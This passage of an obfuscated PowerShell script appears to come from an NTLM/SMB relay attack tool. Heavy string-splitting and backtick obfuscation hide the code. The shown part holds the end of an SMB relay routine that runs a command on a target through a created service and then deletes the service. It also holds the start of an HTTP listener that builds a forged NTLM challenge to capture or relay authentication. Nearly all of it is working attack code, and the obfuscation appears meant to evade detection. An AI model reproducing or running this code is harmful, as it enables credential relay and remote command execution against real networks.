                                ${S`m`B_Re`lAY_fai`Led} = ${T`RUe}
                            }
 
                        }
                
                        ("{3}{1}{0}{2}"-f'rvice','teSe','W','Dele')
                        { 

                            if(  ${W`2EHx}::"tO`STring"(${SmB_C`L`iEnT_r`EC`eIvE}[108..111]) -eq ("{1}{0}{3}{2}" -f'0','1d-','00','4-00-'))
                            {
                                ${Inv`Ei`gH}."c`oNs`OLe_queUE".("{1}{0}" -f'd','Ad').Invoke(('SM'+'B '+'re'+'lay'+' '+'com'+'m'+'and '+'exec'+'uted'+' '+'o'+'n '+"$Target"))

                                if(${iN`Ve`iGH}."fi`Le_oUTP`Ut")
                                {
                                    ${INVe`iGh}."Log_`File_`QU`eUe".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - SMB relay command executed on $Target "))
                                }

                                if(${I`NVE`iGH}."lOG`_`OUtpuT")
                                {
                                    ${iN`V`eigH}."l`Og".("{1}{0}" -f 'dd','A').Invoke(("$(Get-Date -format 's') - SMB relay command executed on $Target "))
                                }

                            }
                            elseif(  ${W`2`Ehx}::"t`oSTR`iNG"(${s`mb_`cLi`ent`_rEc`EiVE}[108..111]) -eq ("{1}{2}{3}{0}"-f'0-00','02','-00','-0'))
                            {
                                ${I`NVE`Igh}."coN`sole_q`U`E`Ue".("{1}{0}" -f'dd','A').Invoke(('S'+'MB '+'rel'+'ay '+'se'+'rvice '+"$SMB_service "+'fai'+'le'+'d '+'to'+' '+'sta'+'rt'+' '+'on'+' '+"$Target"))

                                if(${i`NV`eIGh}."fIle`_O`UT`PUt")
                                {
                                    ${I`NvEi`gh}."l`OG_file_Q`Ue`Ue".("{1}{0}"-f'dd','A').Invoke(('S'+'MB '+'rel'+'ay'+' '+'service'+' '+"$SMB_service "+'fa'+'iled'+' '+'t'+'o '+'s'+'ta'+'rt '+'on'+' '+"$Target"))
                                }

                                if(${iNv`E`Igh}."LOG_O`Utp`Ut")
                                {
                                    ${i`NVei`GH}."l`oG".("{1}{0}" -f'd','Ad').Invoke(('SMB'+' '+'rel'+'a'+'y '+'servi'+'c'+'e '+"$SMB_service "+'f'+'ailed '+'t'+'o '+'star'+'t'+' '+'on'+' '+"$Target"))
                                }

                            }

                            ${smB2_`mEss`A`gE`_iD} += 20
                            ${pACKEt_`smb2`_`h`eaDER} = &("{2}{1}{4}{3}{0}{5}" -f'SMB2Head','ac','Get-P','et','k','er') 0x09,0x00 ${SM`B2_mEssA`G`E_`Id} ${sMB2_`Tr`EE`_id} ${Sm`B`_ses`sion_`iD}
                            ${P`AckET`_SMB2_heA`deR}[("{1}{7}{2}{4}{0}{3}{5}{6}" -f '_C','SM','2Head','reditRe','er','q','uest','B')] = 0x7f,0x00
                            ${p`AC`KET`_sc`M_DaTa} = &("{7}{4}{1}{2}{5}{6}{3}{0}"-f 'W','k','etSCMDelet','e','-Pac','eServi','c','Get') ${sM`B_seRVIce_`cON`T`e`xT_`HA`NdLe}
                            ${s`cM`_`dATa} = &("{6}{4}{1}{0}{8}{7}{2}{3}{5}" -f 'PacketO','From-','ictio','nar','vert','y','Con','eredD','rd') ${Pa`Cket`_sCM`_D`AtA}
                            ${paCk`e`T_`RPc`_d`Ata} = &("{0}{3}{4}{1}{2}"-f 'Get-Pa','Reque','st','cketR','PC') 0x03 ${S`cm_`DATa}."lENg`TH" 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                            ${Rpc_`da`Ta} = &("{2}{6}{0}{5}{4}{3}{1}" -f't','y','Convert','ar','iction','OrderedD','From-Packe') ${PA`CKe`T_R`Pc_`datA}
                            ${pAC`KEt`_`Smb2`_DA`TA} = &("{1}{4}{2}{5}{3}{0}" -f 'riteRequest','Get-Packe','SMB','W','t','2') ${SMb_`F`ilE_iD} (${RPc_`D`ATa}."LE`Ngth" + ${SC`m_Da`TA}."l`E`NgTH")
                            ${smB`2_h`eaDEr} = &("{5}{4}{7}{9}{2}{0}{8}{3}{6}{1}"-f'r','ary','etOrde','tio','onvertFr','C','n','om','edDic','-Pack') ${PA`Ck`Et_s`mb2_`HEAD`ER}
                            ${s`M`B2_DaTA} = &("{2}{4}{8}{0}{6}{3}{5}{7}{1}"-f'From-Pac','ry','Co','red','n','Dict','ketOrde','iona','vert') ${PACkET_`sm`B2_`DATa} 
                            ${R`pc_DatA`_l`Eng`TH} = ${SMb2_`DA`Ta}."LEnG`Th" + ${S`C`M_`DATa}."l`En`gtH" + ${RpC_da`TA}."leN`gth"
                            ${p`AcKet_NETbIOS_`se`s`SI`on_SeRv`IcE} = &("{9}{2}{6}{1}{8}{0}{3}{4}{7}{5}" -f 'IO','cke','-P','S','SessionS','ce','a','ervi','tNetB','Get') ${sMB2`_HEA`d`Er}."lEN`gtH" ${rP`C_da`TA`_lengTh}
                            ${nEtbIos_s`E`SSio`N_SERV`icE} = &("{7}{5}{1}{8}{3}{6}{2}{4}{0}"-f 'y','F','redDictio','m-','nar','ert','PacketOrde','Conv','ro') ${P`AckeT_N`ETbios_`sEss`IO`N_sE`RvI`cE}
                            ${s`mB`_clIEnt_`seND} = ${nEtB`iOS`_sesS`io`N_SErViCE} + ${s`Mb2_`H`Eader} + ${sM`B2_Da`TA} + ${rP`C_D`ATa} + ${sC`m_D`ATA}
                            ${SMB_cLI`e`NT_sTR`Eam}.("{0}{1}"-f 'W','rite').Invoke(${s`mb_cLIEn`T_`sEnd},0,${sm`B_`CLie`Nt_`sEnD}."lEN`gth")
                            ${smb_cLIE`N`T`_St`Re`AM}.("{1}{0}" -f'lush','F').Invoke()
                            ${smB_Cl`Ien`T_STrE`AM}.("{1}{0}"-f'ead','R').Invoke(${SMb_CL`I`enT_r`ECe`IVE},0,${smB_CL`IenT_rec`eI`VE}."Le`N`Gth")
                            ${sm`B_CLienT_s`Ta`gE} = ("{0}{1}{2}" -f'Read','Reque','st')
                            ${SmB_`CL`IeNT_`sT`A`GE_NEXT} = ("{5}{0}{3}{2}{1}{4}" -f 'r','n','a','viceH','dle','CloseSe')
                            ${s`MB_`close_sERviCe_`hanD`L`e_`STagE} = 1
                        }

                        ("{1}{4}{3}{0}{2}" -f'iceHa','Cl','ndle','rv','oseSe')
                        {

                            if(${Smb`_`CLOS`E_`S`eRvIce_`hAndLE`_`st`AGe} -eq 1)
                            {
                                ${iN`VEi`gH}."con`SOl`E`_qUEuE".("{1}{0}"-f'dd','A').Invoke(('SM'+'B '+'r'+'elay '+'s'+'er'+'vice '+"$SMB_service "+'d'+'eleted'+' '+'on'+' '+"$Target"))
                                ${SmB`2`_M`ESsAGe_`Id} += 20
                                ${SmB_`cLOS`e_`sErvIC`e_ha`NDlE`_ST`AGe}++
                                ${pa`CKeT_SC`M_`da`Ta} = &("{5}{2}{0}{1}{8}{6}{3}{7}{4}"-f 'ketSCMC','lose','Pac','rviceHa','e','Get-','e','ndl','S') ${sMB_`S`ER`VI`C`E`_COnTeXt_HANdlE}

                                if(${InV`ei`GH}."FiLe`_outP`UT")
                                {
                                    ${In`V`eiGh}."lOG`_`Fi`LE_QuE`Ue".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - SMB relay service $SMB_service deleted on $Target "))
                                }

                                if(${i`N`VEIGh}."lOG`_`oUtpuT")
                                {
                                    ${iN`VeI`GH}."L`og".("{0}{1}" -f'A','dd').Invoke(("$(Get-Date -format 's') - SMB relay service $SMB_service deleted on $Target "))
                                }

                            }
                            else
                            {
                                ${S`mb2_mES`s`Ag`e_Id} += 1
                                ${sm`B_cl`ie`N`T_STagE} = ("{1}{2}{0}"-f 't','CloseRe','ques')
                                ${P`ACKE`T_sCm`_dATA} = &("{0}{5}{4}{2}{1}{3}{6}"-f 'Get-P','vice','CMCloseSer','Hand','tS','acke','le') ${SMB_sERVi`Ce_`mANAgE`R`_coNt`e`xT_hanDLe}
                            }

                            ${paC`kET_s`MB2`_he`ADER} = &("{5}{0}{3}{2}{4}{1}"-f '-','der','cketS','Pa','MB2Hea','Get') 0x09,0x00 ${smB`2`_`meSSagE_iD} ${smB2_T`RE`e_`id} ${S`mb_`SessIOn_`iD}
                            ${paCk`eT_smb2`_He`AdEr}[("{1}{3}{0}{6}{4}{5}{2}"-f 'r_','SMB2H','st','eade','reditRequ','e','C')] = 0x7f,0x00
                            ${s`CM_DatA} = &("{2}{1}{3}{5}{0}{6}{4}" -f 'OrderedDi','nvertF','Co','rom-P','ary','acket','ction') ${PaCKEt_`S`C`m`_daTA}
                            ${p`ACKeT_R`P`C_daTa} = &("{0}{3}{4}{6}{5}{2}{1}"-f 'Get-','st','e','P','a','u','cketRPCReq') 0x03 ${s`cM`_Data}."LENg`TH" 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                            ${Rpc`_D`AtA} = &("{1}{0}{4}{6}{2}{3}{5}" -f 'ertF','Conv','c','ketOrderedDict','rom-P','ionary','a') ${pA`cK`eT_`Rp`c_DaTA} 
                            ${pacKEt_SM`B`2`_DATa} = &("{0}{4}{3}{5}{2}{1}" -f 'G','iteRequest','Wr','tSMB','et-Packe','2') ${Smb`_Fi`le_`Id} (${RPC_`d`ATa}."LENG`Th" + ${sCm_`daTA}."LeN`GtH")
                            ${Sm`B`2_hEaDeR} = &("{0}{5}{4}{1}{3}{2}" -f 'Convert','eredDicti','ary','on','cketOrd','From-Pa') ${pA`cKET_s`Mb2_H`EAder}
                            ${SM`B2`_`daTa} = &("{7}{2}{3}{5}{1}{6}{4}{9}{0}{8}"-f'ar','tOrd','onvertF','ro','r','m-Packe','e','C','y','edDiction') ${paC`K`Et_sMb2`_DATA} 
                            ${rP`C`_DATA_L`en`GTh} = ${sMb`2`_dA`Ta}."LE`NgtH" + ${ScM_D`A`TA}."lE`NgTH" + ${r`pC_`DaTa}."leN`gth"
                            ${PaC`k`E`T_nEtBiO`S`_sesSIO`N`_`SeRVice} = &("{0}{5}{1}{2}{3}{6}{4}{7}" -f 'Get','k','etNe','tBIOS','s','-Pac','Se','sionService') ${Sm`B2_hEAD`ER}."L`eNgth" ${R`PC_`D`ATA_`LeNgtH}
                            ${NeTbIOS_s`E`ss`I`on`_S`ERVICE} = &("{0}{5}{4}{6}{1}{3}{2}" -f 'Co','cketOr','ictionary','deredD','rtFr','nve','om-Pa') ${p`AcKE`T`_`NEtbioS_SEssion_`SERviCE}
                            ${S`mb_C`l`IENt`_senD} = ${nETB`I`os`_sESSI`ON_`SER`Vi`CE} + ${sMb2_H`ead`ER} + ${SMb2`_DA`Ta} + ${RPC_`D`AtA} + ${S`Cm_d`A`TA}
                            ${smb`_CL`iENT`_stRE`Am}.("{1}{0}"-f 'rite','W').Invoke(${SM`B_`CL`i`ent_SE`Nd},0,${smb`_cL`I`e`N`T_sEnd}."Leng`Th")
                            ${S`mb`_c`Lie`Nt_STr`Eam}.("{0}{1}"-f'Flus','h').Invoke()
                            ${SMB`_`clie`N`T_St`REaM}.("{0}{1}"-f'Re','ad').Invoke(${sMB`_`CLIent`_`Re`CEivE},0,${Sm`B_`CLi`EN`T_R`eC`Eive}."L`Ength")
                        }

                        ("{2}{0}{1}{3}"-f 'os','eReq','Cl','uest')
                        {
                            ${s`mB`2_M`EsSA`GE_id} += 20
                            ${pA`cket_`SMb`2_Head`er} = &("{1}{0}{2}{4}{6}{5}{3}"-f 't','Ge','-Packe','er','t','ead','SMB2H') 0x06,0x00 ${sM`B2_me`ssagE_`Id} ${s`m`B2_trEE_Id} ${S`mB_`S`EsSiO`N_iD}
                            ${PACK`eT`_smB2_`h`EADer}[("{1}{4}{0}{2}{3}" -f 'eader_C','SM','reditReques','t','B2H')] = 0x7f,0x00
                            ${P`ACKET`_Sm`B2_`DatA} = &("{4}{1}{0}{6}{7}{2}{3}{5}"-f 'a','t-P','eRe','q','Ge','uest','cketSMB2C','los') ${SmB`_`FiLe_Id}
                            ${SMb2`_he`A`DEr} = &("{4}{7}{5}{8}{0}{1}{6}{2}{3}{9}"-f 'rder','e','Dic','tionar','Co','From-Pack','d','nvert','etO','y') ${pACkE`T`_`sm`B2_`heaDER}
                            ${S`m`B2`_data} = &("{6}{10}{8}{3}{9}{7}{2}{5}{1}{4}{0}" -f'y','a','Dicti','O','r','on','Co','ed','-Packet','rder','nvertFrom') ${PAc`K`ET_Sm`B2_`d`Ata}
                            ${p`AC`kEt_n`etBIOs_sEssIOn_`sER`V`iCe} = &("{4}{2}{1}{0}{5}{3}"-f 'essi','SS','IO','nService','Get-PacketNetB','o') ${smb2_`hE`AD`er}."lE`NG`Th" ${smb2_`DA`TA}."L`enGTH"
                            ${NE`T`BIO`s_SE`SSIOn_se`R`VI`CE} = &("{1}{7}{6}{5}{3}{0}{4}{2}{8}" -f'icti','Conve','na','deredD','o','ketOr','From-Pac','rt','ry') ${PAcKe`T`_`Net`B`I`o`S_Se`ssIoN_SERViCE}
                            ${sMb_C`lI`EN`T_sEND} = ${nETBi`Os_SE`SsI`o`N`_`SErViCe} + ${SmB2`_`heaD`eR} + ${Smb2`_D`Ata}
                            ${S`mB_CliEnt_`S`T`R`EAM}.("{1}{0}" -f 'e','Writ').Invoke(${sM`B_cLien`T`_SeND},0,${Smb`_CLi`ENT_`seND}."Len`GTH")
                            ${SMb`_cli`e`Nt_strEAM}.("{1}{0}" -f'lush','F').Invoke()
                            ${SMB`_clIen`T_`S`Tr`EaM}.("{0}{1}"-f'Re','ad').Invoke(${S`MB_CLIEn`T_re`cEi`Ve},0,${sMB`_`C`Lien`T_`ReCEi`Ve}."len`Gth")
                            ${S`mb_cLiEN`T`_`STA`gE} = ("{3}{1}{0}{2}"-f 'sconn','i','ect','TreeD')
                        }

                        ("{1}{0}{4}{2}{3}"-f'ee','Tr','isc','onnect','D')
                        {
                            ${smb`2_`M`eSSagE`_iD} += 1
                            ${p`ACkET_s`mb2`_H`EADer} = &("{1}{3}{4}{0}{2}"-f '2H','Get','eader','-Packet','SMB') 0x04,0x00 ${SMB2`_MeSSA`gE`_`ID} ${Sm`B2_t`REe`_`ID} ${S`mb_sesSi`oN`_Id}
                            ${P`A`c`KeT_sm`B2`_hEAd`eR}[("{6}{5}{2}{0}{3}{4}{1}"-f 'H','der_CreditRequest','2','e','a','B','SM')] = 0x7f,0x00
                            ${pAC`ket_sM`B2`_`DaTA} = &("{3}{2}{6}{4}{7}{0}{1}{5}" -f 'is','connectReq','t','Ge','PacketSMB2','uest','-','TreeD')
                            ${Smb2`_H`eAdER} = &("{3}{2}{4}{1}{0}{7}{5}{6}" -f 'ct','-PacketOrderedDi','onvertFro','C','m','nar','y','io') ${Packe`T_`Smb2_`hea`der}
                            ${sMB`2`_DATA} = &("{0}{8}{4}{5}{3}{1}{6}{7}{2}"-f 'Con','tOr','ary','Packe','r','tFrom-','dered','Diction','ve') ${packE`T`_s`mB2_`dATA}
                            ${PACK`ET_neT`Bios_sE`S`siO`N`_serv`IcE} = &("{2}{1}{5}{4}{0}{3}" -f'nServ','et-PacketNetBI','G','ice','ssio','OSSe') ${S`mB2_HEA`DEr}."L`engTH" ${SmB2`_Da`TA}."LE`Ngth"
                            ${N`eTBIOs`_SeSSIo`N`_S`ervIce} = &("{5}{3}{1}{6}{2}{4}{8}{0}{7}{9}"-f 'Or','tF','m-Pa','onver','c','C','ro','deredDiction','ket','ary') ${pA`CKeT`_N`EtBi`oS_s`e`SSi`On_sEr`ViCE}
                            ${s`mB_ClieNt_`s`e`Nd} = ${NETBIoS_`S`eSS`io`N_SErv`Ice} + ${smb2_`h`eaD`ER} + ${S`mb2_`d`Ata}
                            ${S`MB`_`clIent_S`TREAM}.("{1}{0}" -f'ite','Wr').Invoke(${sMb`_CliEn`T_SE`ND},0,${SmB_c`Lie`NT_`SeND}."l`e`NGTH")
                            ${S`mB`_clieNT`_S`Tre`Am}.("{1}{0}"-f'ush','Fl').Invoke()
                            ${SMB_C`l`ieN`T_sTr`EAm}.("{1}{0}"-f 'd','Rea').Invoke(${s`mb_cli`eN`T_R`eCei`Ve},0,${sM`B_clI`e`NT_reCEiVe}."Le`NGTH")
                            ${sM`B_CLi`En`T_STAGe} = ("{2}{1}{0}" -f 'off','og','L')
                        }

                        ("{1}{0}" -f 'goff','Lo')
                        {
                            ${sMb`2_`m`essAge`_id} += 20
                            ${p`ACK`et_`sMB2_HeADER} = &("{3}{0}{1}{2}{4}"-f 'Pack','etSM','B2Hea','Get-','der') 0x02,0x00 ${SM`B2`_MesS`A`gE_id} ${s`m`B2_TREE_Id} ${sMb_`sesS`IOn_`ID}
                            ${pAc`kEt_S`mB2`_HE`ADER}[("{5}{4}{0}{7}{3}{6}{1}{2}" -f'2He','ue','st','der_C','B','SM','reditReq','a')] = 0x7f,0x00
                            ${PaC`kET_`SMB2_`Da`Ta} = &("{0}{1}{3}{7}{10}{9}{6}{4}{2}{8}{5}" -f'Get-P','acketSM','equ','B2S','ogoffR','st','nL','e','e','sio','s')
                            ${SMB2_`Hea`deR} = &("{0}{1}{7}{9}{2}{3}{6}{8}{4}{5}{10}"-f'Conv','er','m','-P','eredDictio','na','acketO','tFr','rd','o','ry') ${p`ACket_`S`mb2_HE`ADer}
                            ${S`MB2`_daTa} = &("{1}{7}{0}{2}{6}{5}{8}{4}{3}" -f'tFrom','Conve','-Pa','nary','ctio','etOrdere','ck','r','dDi') ${Pa`Ck`et_Smb2_`dA`TA}
                            ${PAcKE`T_`NeT`BIOS_`S`e`sSiON`_sEr`VicE} = &("{8}{6}{4}{1}{7}{0}{3}{2}{5}"-f'IOS','ketNet','e','SessionS','c','rvice','t-Pa','B','Ge') ${s`Mb2_h`eAd`er}."leNG`TH" ${SmB`2`_da`Ta}."LE`NGth"
                            ${NE`TBIOS`_S`E`ss`IO`N_sErVICE} = &("{3}{4}{7}{6}{9}{0}{8}{2}{5}{10}{1}" -f'a','y','rder','Co','n','edDicti','m','vertFro','cketO','-P','onar') ${p`AcK`ET_nETbiOs_SES`siO`N_sE`RvICE}
                            ${Smb_`c`l`ient_seND} = ${nET`BiOs`_SEssiON_`SerVI`Ce} + ${S`Mb2_he`Ad`ER} + ${S`Mb2`_DaTA}
                            ${SM`B`_C`lieNT`_stREam}.("{1}{0}" -f 'ite','Wr').Invoke(${smb_c`L`ieNt_`SEnD},0,${s`m`B_clI`eNT_Se`ND}."l`en`GtH")
                            ${Sm`B_CLIe`NT_s`TREAM}.("{1}{0}" -f 'sh','Flu').Invoke()
                            ${S`MB_Cl`IEN`T_STR`E`Am}.("{1}{0}"-f'ad','Re').Invoke(${smB_`C`L`IeNT`_rECE`ivE},0,${smB_`clI`ENT_`RE`CeivE}."lEn`gtH")
                            ${smb`_c`LiEnT_`stAge} = ("{0}{1}"-f 'E','xit')
                        }

                    }

                    if(${s`mB`_rE`lAy_`FA`IleD})
                    {
                        ${i`Nve`igh}."cONSo`Le_q`UE`UE".("{1}{0}"-f'dd','A').Invoke(('S'+'MB '+'relay'+' '+'f'+'ailed '+'on'+' '+"$Target"))
                        ${Smb_C`LIEnT`_S`TAGe} = ("{0}{1}"-f 'Ex','it')

                        if(${i`NV`eIgH}."fI`le`_O`UtPut")
                        {
                            ${I`NVEI`gH}."LOg_F`ILE`_QUEuE".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - SMB relay failed on $Target "))
                        }

                        if(${InvE`i`Gh}."l`OG_oUT`P`Ut")
                        {
                            ${I`NvE`igH}."l`OG".("{1}{0}" -f'dd','A').Invoke(("$(Get-Date -format 's') - SMB relay failed on $Target "))
                        }

                    }

                }
            
            }

            if(!${SMB_`Rel`AY_f`Ai`LeD} -and ${R`ElAyaUtOD`i`S`AbLE} -eq 'Y')
            {
                ${IN`VEi`Gh}."cOnSO`L`E_qU`EUe".("{0}{1}" -f'A','dd').Invoke(("{0}{4}{1}{7}{2}{9}{8}{5}{10}{6}{3}" -f 'S','B re','y auto dis','cess','M','ue','uc','la','d d','able',' to s'))
                ${iN`Ve`IGh}."sMb`_r`e`lay" = ${fal`Se}

                if(${I`Nv`EIgh}."FILE_`O`UtPut")
                {
                    ${In`VEI`gh}."L`OG_f`ILE_qUEUE".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - SMB relay auto disabled due to success "))
                }

                if(${iNv`EIgh}."LOg_Out`p`UT")
                {
                    ${I`NVE`igh}."l`og".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - SMB relay auto disabled due to success "))
                }

            }

        }
        
        ${sMb_R`el`AY_SO`C`kET}.("{0}{1}" -f'C','lose').Invoke()

        return ${Smb_Cl`ienT_r`ecEI`VE}
    }

}


${Http_SC`RI`pTB`LocK} = 
{ 
    param (${Ch`Allen`gE},${co`MMa`ND},${HTT`P`ip},${HTTpp`ORT},${HTT`PRE`s`ETDelay},${hTTp`ReSE`TDela`Yt`IMeo`UT},${Htt`P`S`_l`ISTenER},${pr`Oxy},${PrO`XyI`gNORe},${Pro`Xy_`LI`s`TEnEr},${RElAyAu`TO`DISa`B`Le},${SER`VIce},${s`M`B`_VeRSiON},${TAR`GEt},${user`NAM`eS},${wPA`daU`Th},${wPADa`U`Thi`gNoRE},${WpA`drE`s`ponse})

    function nTlmc`HaLl`E`Ng`eBase64
    {
        param ([String]${challE`N`GE},[String]${Cl`ieN`T`IPaDd`ReSs},[Int]${c`L`IEN`TpoRt})

        ${Http`_ti`m`es`TAmp} = &("{2}{0}{1}" -f't-D','ate','Ge')
        ${Http`_TIMest`A`mp} = ${htT`p_T`IME`StAMp}.("{2}{1}{0}" -f 'e','ileTim','ToF').Invoke()
        ${hTTP_`T`I`MEstA`MP} =  (&("{2}{1}{0}" -f'e','IabL','vAr') ("W2"+"EHX") -vAlueONL  )::("{0}{1}" -f 'ToStri','ng').Invoke( ${W2e`hx}::("{0}{1}{2}"-f'Ge','tByt','es').Invoke(${HttP_T`ime`S`TaMP}))
        ${Http_`TIM`eS`TAmP} = ${h`TTP_T`imESTAMp}.("{0}{1}"-f 'Spl','it').Invoke("-") | &("{1}{2}{0}{3}"-f'rEach-Obje','F','o','ct'){[Char] (  &('gI')  ("VariAbl"+"E"+":K"+"pa")  )."v`ALUe"::("{2}{0}{1}"-f 't1','6','ToIn').Invoke(${_},16)}

        if(${c`HalLE`NgE})
        {
            ${hT`TP_`C`hAlle`Nge} = ${CH`A`LlEngE}
            ${Http`_C`haLLe`NGE_B`yT`eS} = ${HTTp`_Ch`AlLE`N`GE}.("{1}{0}{2}" -f 's','In','ert').Invoke(2,'-').("{0}{1}" -f'Ins','ert').Invoke(5,'-').("{1}{0}" -f 'ert','Ins').Invoke(8,'-').("{0}{1}" -f 'In','sert').Invoke(11,'-').("{1}{0}" -f 'nsert','I').Invoke(14,'-').("{0}{2}{1}"-f 'I','t','nser').Invoke(17,'-').("{1}{0}" -f 'sert','In').Invoke(20,'-')
            ${HtTp_cHa`l`L`ENGE_By`Tes} = ${HTT`P_`cha`LLeNGE_`By`T`ES}.("{0}{1}"-f'S','plit').Invoke("-") | &("{4}{3}{0}{1}{2}" -f'ach','-Ob','ject','orE','F'){[Char] ${K`pA}::("{0}{2}{1}"-f'T','t16','oIn').Invoke(${_},16)}
        }
        else
        {
            ${HTT`p_`c`HalLenGE_`By`TeS} = [String](1..8 | &("{1}{3}{2}{0}" -f 'ct','ForEach','bje','-O'){"{0:X2}" -f (&("{1}{2}{0}" -f 'm','Get-','Rando') -Minimum 1 -Maximum 255)})
            ${hT`Tp_c`h`AllEn`ge} = ${hTtp_CHa`Llen`ge_`By`T`Es} -replace ' ',''
            ${htTp_c`hAll`En`G`e`_bYt`eS} = ${H`TTp_cHA`l`leN`Ge_byt`Es}.("{1}{0}"-f 'lit','Sp').Invoke(" ") | &("{2}{0}{3}{1}" -f'r','-Object','Fo','Each'){[Char] ${K`pA}::("{1}{0}" -f 'Int16','To').Invoke(${_},16)}
        }

        ${In`Ve`IGh}."HtTP_chALL`en`G`E`_qUEUe".("{1}{0}"-f 'd','Ad').Invoke(${C`L`ie`NtIPad`dRess} + ${c`LIE`Nt`PorT} + ',' + ${h`TTp_`ChA`ll`eNge})  > ${nu`lL}

        ${Http`_ntlm_`By`TES} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,
                            0x00,0x00,0x00,0x05,0x82,0x89,0xa2 +
                            ${h`Tt`P_`chAllE`NgE_Bytes} +
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,
                            0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00,0x02,0x00,0x06,0x00,
                            0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,
                            0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00,0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,
                            0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,
                            0x00,0x68,0x00,0x6f,0x00,0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,
                            0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,
                            0x00,0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,
                            0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00 +
                            ${htTp_`T`imEs`Ta`mp} +
                            0x00,0x00,0x00,0x00,0x0a,0x0a

        ${nT`l`m`_chall`ENg`e_baSe64} =  (  &("{1}{0}{2}" -f'RIA','Va','BLE')  kPa )."VA`luE"::"ToBa`se64`s`TrINg"(${HTTp`_n`Tl`M_byT`eS})
        ${N`TLm} = ("{0}{1}" -f'NTLM',' ') + ${Ntlm_c`h`AllenGe_`BASE64}
        ${NTlM`_`c`HALLeNGE} = ${HtTP_CHalL`eN`gE}

        return ${nt`lM}
    }

    if(${hT`T`ps_LIsT`EneR})
    {
        ${hT`Tp`_TypE} = ("{1}{0}"-f'TTPS','H')
    }
    elseif(${pro`xy`_Li`STEnEr})
    {
        ${ht`Tp_TY`PE} = ("{0}{1}"-f 'Pro','xy')
    }
    else
    {
        ${ht`Tp_Ty`Pe} = ("{0}{1}"-f'HTT','P')
    }

    if(${htt`P`Ip} -ne ("{1}{0}"-f'0.0.0','0.'))
    {
        ${ht`Tp`IP} =   (  &("{1}{0}" -f'CI','g') ("vAriaBLe:"+"1"+"2ux"))."v`AlUe"::("{1}{0}"-f'e','Pars').Invoke(${HTTp`iP})
        ${HT`T`p`_`enDpoInT} = &("{1}{2}{0}" -f 'ct','New-','Obje') ("{0}{3}{4}{1}{2}"-f 'System.Net','dPoi','nt','.IP','En')(${hTT`pIp},${ht`TppO`RT})
    }
    else
    {
        ${ht`TP_e`N`DpoInt} = &("{2}{1}{0}"-f 'ct','Obje','New-') ("{6}{4}{1}{5}{3}{0}{2}"-f'd','.Ne','Point','.IPEn','m','t','Syste')( (&("{1}{0}{2}"-f 'IAbl','VAR','E') ('12'+'Ux') )."V`AlUE"::"a`Ny",${Httpp`o`RT})
    }

    ${HttP_`RU`NN`ing} = ${tr`UE}
    ${H`TTP`_LI`StEN`ER} = &("{3}{1}{2}{0}"-f't','e','w-Objec','N') ("{2}{0}{1}{4}{3}{6}{5}"-f't.S','ocke','System.Ne','cpL','ts.T','er','isten') ${HTTp_e`N`D`P`OiNT}
    ${HTTp`_CL`IE`NT_CLosE} = ${TR`Ue}
    ${RElAY`_`STeP} = 0

    if(${p`RoxY_LIs`Ten`er})
    {
        ${h`TTp`_lINg`eR} = &("{0}{2}{1}"-f 'N','-Object','ew') ("{7}{3}{5}{4}{2}{0}{6}{1}" -f'Sockets.Linger','ion','.','e','t','m.Ne','Opt','Syst')(${tr`Ue},0)
        ${htTp_`L`I`sTeNeR}."SeRV`eR"."li`NGe`RStAte" = ${hT`Tp_L`i`NGeR}
    }

    try
    {
        ${H`TTp_L`IST`EnER}.("{1}{0}"-f 'rt','Sta').Invoke()
    }
    catch
    {
        ${Inv`eIgh}."c`oNS`OLe`_Q`UeUE".("{1}{0}" -f'd','Ad').Invoke(("$(Get-Date -format 's') - Error starting $HTTP_type listener "))
        ${HTTp_R`UnnI`NG} = ${FA`lse}

        if(${i`N`VeiGH}."f`i`L`e_OutPuT")
        {
            ${INv`E`IGH}."lOg_fil`e_QuE`Ue".("{1}{0}" -f 'dd','A').Invoke(("$(Get-Date -format 's') - Error starting $HTTP_type listener "))
        }

        if(${I`NV`eigh}."L`og`_OUtp`UT")
        {
            ${iNv`eI`Gh}."L`og".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - Error starting $HTTP_type listener "))
        }

    }

    :HTTP_listener_loop while(${InVE`igh}."rELAy`_`RU`NnInG" -and ${httP_r`U`NNiNG})
    {
        ${tcP_r`eQ`Uest} = ""
        ${t`cP_reQueS`T`_bYteS} = &("{1}{2}{0}"-f'-Object','Ne','w') ("{0}{1}{2}{3}{4}"-f'Sy','st','em.B','yt','e[]') 4096
        ${h`TTP`_sEnD} = ${Tr`Ue}
        ${hT`Tp`_h`eAd`er_CONTEN`T_tYPE} = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 +   (&("{0}{3}{1}{2}" -f 'geT-va','Ia','ble','R') OaKf)."vAL`Ue"::"u`Tf8".("{2}{1}{0}"-f 's','etByte','G').Invoke(("{2}{1}{0}"-f'l','t/htm','tex'))
